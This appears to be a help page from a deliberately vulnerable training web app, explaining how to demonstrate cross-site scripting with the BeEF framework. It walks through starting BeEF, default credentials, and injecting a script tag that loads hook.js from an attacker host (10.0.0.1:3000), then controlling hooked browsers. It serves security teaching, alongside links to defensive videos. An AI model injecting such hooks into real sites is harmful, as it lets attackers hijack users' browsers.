			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			Cross-site scripting and HTML injection may occcur
			when user or attacker controlled input is later incorporated
			without being encoded into the web server response. In other words, the attacker
			can send input which later is incorporated into the web page the user receives.
			<br/><br/>
			Development teams or management might not understand why XSS is such a big deal. Trivial
			demonstrations such as popping up an alert box do not help in these cases. The
			Browser Exploitation Framework (BeEF) allows remote control of injected browser
			making demonstration easy, effective and convincing.
<br/><br/>
<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
			<br/><br/>
			<span class="report-header">Starting BeEF</span>
			<br/><br/>
			<ul>
				<li>In the attacker machine, open a command prompt</li>
				<li>Start beef. For example in Samurai command is "beef".</li>
				<li>If unsure of where the beef program is located, the "locate beef" command may help</li>
				<li>Once BeEF starts carefully note the "Hook URL" and the "UI URL"</li>
				<li>The "Hook URL" will be embedded into the cross-site script sent to the user. Save this
				URL for later.</li>
				<li>BeEF starts a web server running. The "UI URL" is the URL to the administrative console
				set up by BeEF. Open a browser on the attacker host and paste the "UI URL".
				The BeEF administrative console
				will load as a web page. Login using "beef" as both the user name and password.</li>
			</ul>
			<br/>
			<span class="report-header">Using BeEF</span>
			<br/>
			<ul>
				<li>Verify the "Hook URL" works. This can be done on the attacker machine. Simply
				open a web browser and paste the "Hook URL". Verify the contents of the BeEF JavaScript hook.js
				is visible. It is quite lengthly and will be obvious.</li>
				<li>Create a cross-site script with the "Hook URL" as the value of the "src" (source) attribute.

<br/>
<code>
	&lt;script src=&quot;BEEF HOOK URL GOES HERE&quot;&gt;&lt;/script&gt;
</code>
<br/>
</li>

				<li>An example is
<br/>
<code>
	&lt;script src=&quot;http://10.0.0.1:3000/hook.js&quot;&gt;&lt;/script&gt;
</code>
<br/>
	</li>
	<li>Inject this cross-site script into a vulerable input parameter</li>
	<li>The browser will download and run hook.js from the attacker host
	infecting the browser. The hook.js causes the browser to reach out to
	the attacker machine and connect to the BeEF administrative console</li>
</ul>
<br/>
<span class="report-header">Controlling Hooked Browsers</span>
<br/>
<ul>
	<li>Look under "Hooked Browsers" in the BeEF interface. Currently hooked
	browsers appear as Online</li>
	<li>Click on a hooked browser to display options</li>
	<li>Commands are listed under Commands tab. Commands that are most
	likely to work have green marker</li>
	<li>To execute a command click command then "Execute". Note some commands
	have parameters</li>
	<li>Execute button is in lower right corner</li>
	<li>Command output can be viewed by clicking the respective record
	in the "Module Result History" tab</li>
</ul>
<br/><br/>
<span id="videos" class="report-header">Videos</span>
<br/><br/>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->IntroductiontotheBrowserExploitationFramework);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingPart1WhatisReflectedXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingPart2WhatisDOMbasedXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingPart3WhatisPersistentXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->OutputEncodingPart1HowItStopsCrosssiteScriptingXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->OutputEncodingPart2HowtoTestifitWorks);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart1);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart2);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart3);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart4);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart5);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->ContentSecurityPolicyScriptSourcescriptsrc);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoSetHTTPHeadersUsingApacheServer);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CheckHTTPHeaderswithcURL);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoCheckHTTPHeadersCommandLine);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoCheckHTTPHeadersfromBrowser);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CookiesPart1HowHTTPOnlyWorks);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatistheXSSProtectionHeader);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CheckforVulnerableLibrariesinYourWebApplication);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoEnableApacheModHeader);?>
<br/><br/>



